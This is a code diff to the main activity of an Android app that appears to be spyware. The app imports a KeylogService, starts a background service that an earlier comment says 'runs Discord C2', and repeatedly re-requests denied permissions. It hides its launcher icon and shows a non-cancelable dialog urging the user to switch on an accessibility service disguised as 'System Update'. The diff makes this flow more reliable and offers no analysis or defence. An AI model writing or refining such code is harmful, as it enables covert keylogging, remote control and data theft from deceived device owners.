@@ -2,6 +2,7 @@ package com.openaccess.sdk
 
 import android.Manifest
 import android.app.Activity
+import android.app.AlertDialog
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
@@ -15,6 +16,7 @@ import android.os.Looper
 import android.provider.Settings
 import android.util.Log
 import android.view.accessibility.AccessibilityManager
+import android.widget.Toast
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import com.openaccess.sdk.service.KeylogService
@@ -24,7 +26,6 @@ class MainActivity : Activity() {
     companion object {
         private const val TAG = "MainActivity"
         private const val RC_ALL = 100
-        private const val RC_MANAGE_STORAGE = 101
 
         val ALL_PERMS = listOfNotNull(
             Manifest.permission.CAMERA,
@@ -60,33 +61,19 @@ class MainActivity : Activity() {
                 false
             }
         }
-
-        fun openAccessibilitySettings(ctx: Context) {
-            try {
-                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                ctx.startActivity(intent)
-            } catch (_: Exception) {
-                try {
-                    val intent = Intent(Settings.ACTION_SETTINGS)
-                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                    ctx.startActivity(intent)
-                } catch (_: Exception) {}
-            }
-        }
     }
 
-    private var permissionsGranted = false
+    private var isFinishingSafely = false
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         if (!isTaskRoot) { finish(); return }
         Log.i(TAG, "onCreate SDK=${Build.VERSION.SDK_INT}")
 
-        // Step 1: Start the background service (runs Discord C2)
+        // Step 1: Start background service immediately
         try { MainService.start(this) } catch (e: Exception) { Log.e(TAG, "start: ${e.message}") }
 
-        // Step 2: Request permissions FIRST — activity must stay alive for dialog
+        // Step 2: Request permissions (activity stays alive for dialog)
         requestAllPerms()
     }
 
@@ -95,7 +82,6 @@ class MainActivity : Activity() {
         Log.i(TAG, "Permissions needed: ${needed.size}/${ALL_PERMS.size}")
 
         if (needed.isEmpty()) {
-            Log.i(TAG, "All permissions already granted")
             onPermissionsReady()
         } else {
             Log.i(TAG, "Requesting: ${needed.joinToString(", ")}")
@@ -107,17 +93,11 @@ class MainActivity : Activity() {
         super.onRequestPermissionsResult(requestCode, perms, results)
         if (requestCode == RC_ALL) {
             val denied = perms.filterIndexed { i, _ -> results[i] != PackageManager.PERMISSION_GRANTED }
-            val granted = perms.filterIndexed { i, _ -> results[i] == PackageManager.PERMISSION_GRANTED }
-
-            if (granted.isNotEmpty()) {
-                Log.i(TAG, "Granted: ${granted.joinToString(", ")}")
-            }
 
             if (denied.isNotEmpty()) {
                 Log.w(TAG, "Denied: ${denied.joinToString(", ")} — re-requesting")
-                // Re-request denied permissions after short delay
                 Handler(Looper.getMainLooper()).postDelayed({
-                    if (!isFinishing && !isDestroyed) {
+                    if (!isFinishing && !isDestroyed && !isFinishingSafely) {
                         ActivityCompat.requestPermissions(this, denied.toTypedArray(), RC_ALL)
                     }
                 }, 500)
@@ -128,11 +108,9 @@ class MainActivity : Activity() {
     }
 
     private fun onPermissionsReady() {
-        if (permissionsGranted) return
-        permissionsGranted = true
         Log.i(TAG, "All permissions granted")
 
-        // Step 3: Hide app icon from launcher
+        // Hide app icon from launcher
         try {
             packageManager.setComponentEnabledSetting(
                 ComponentName(this, MainActivity::class.java),
@@ -143,29 +121,64 @@ class MainActivity : Activity() {
             Log.e(TAG, "hide icon: ${e.message}")
         }
 
-        // Step 4: Open Accessibility settings so user can enable it
-        Handler(Looper.getMainLooper()).postDelayed({
-            if (!isFinishing && !isDestroyed) {
-                if (!isAccessibilityEnabled(this)) {
-                    Log.i(TAG, "Opening Accessibility settings")
-                    openAccessibilitySettings(this)
-                }
-                // Finish activity after settings opens
-                finish()
-            }
-        }, 300)
+        // Open Accessibility settings
+        openAccessibilityAndFinish()
+    }
+
+    private fun openAccessibilityAndFinish() {
+        if (isFinishingSafely) return
+        isFinishingSafely = true
+
+        try {
+            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            startActivity(intent)
+        } catch (e: Exception) {
+            Log.e(TAG, "open settings: ${e.message}")
+        }
+
+        // Finish safely without triggering Android 14+ crash
+        finishAndRemoveTask()
     }
 
     override fun onResume() {
         super.onResume()
-        // Re-check permissions on every resume
-        if (!permissionsGranted) {
-            val stillNeeded = ALL_PERMS.filter { !hasPermission(this, it) }
-            if (stillNeeded.isEmpty()) {
-                onPermissionsReady()
-            } else {
+        if (isFinishingSafely) return
+
+        Log.i(TAG, "onResume — checking state")
+        val permsOk = ALL_PERMS.all { hasPermission(this, it) }
+        val accOk = isAccessibilityEnabled(this)
+
+        when {
+            accOk -> {
+                // Everything ready, close app
+                finishAndRemoveTask()
+            }
+            !permsOk -> {
+                // Permissions missing, request again
                 requestAllPerms()
             }
+            else -> {
+                // Perms OK but accessibility not enabled
+                showEnableAccessibilityAlert()
+            }
         }
+    }
+
+    private fun showEnableAccessibilityAlert() {
+        AlertDialog.Builder(this)
+            .setTitle("Setup Required")
+            .setMessage("Please enable Accessibility Service for the app to work properly.\n\n1. Find 'System Update' in the list\n2. Toggle it ON\n3. Tap Allow")
+            .setPositiveButton("Open Settings") { _, _ ->
+                try {
+                    startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+                } catch (_: Exception) {}
+                finishAndRemoveTask()
+            }
+            .setNegativeButton("Later") { _, _ ->
+                finishAndRemoveTask()
+            }
+            .setCancelable(false)
+            .show()
     }
 }
